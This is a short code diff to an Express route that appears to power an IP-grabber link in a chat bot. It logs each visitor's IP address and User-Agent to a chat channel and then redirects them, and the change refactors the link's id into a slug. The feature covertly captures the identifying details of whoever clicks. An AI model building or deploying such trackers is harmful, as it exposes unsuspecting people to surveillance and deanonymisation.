@@ -3,8 +3,8 @@ import { ipLoggerService } from '../client/features/ip-logger-service';
 
 const featuresRouter = express.Router();
 
-featuresRouter.get('/ip-logger/:id', (req, res) => {
-  const id = req.params.id;
+featuresRouter.get('/ip-logger/:slug', (req, res) => {
+  const [id, seed] = req.params.slug.split('-');
   const ip = (
     req.ip ??
     req.headers['x-forwarded-for']?.toString() ??
@@ -17,10 +17,10 @@ featuresRouter.get('/ip-logger/:id', (req, res) => {
 
   const userAgent = req.headers['user-agent'] || 'Unknown';
 
-  const channel = ipLoggerService.getChannel(id);
+  const logger = ipLoggerService.getLogger(id);
 
-  if (channel) {
-    channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
+  if (logger) {
+    logger.channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
   }
 
   res.redirect(
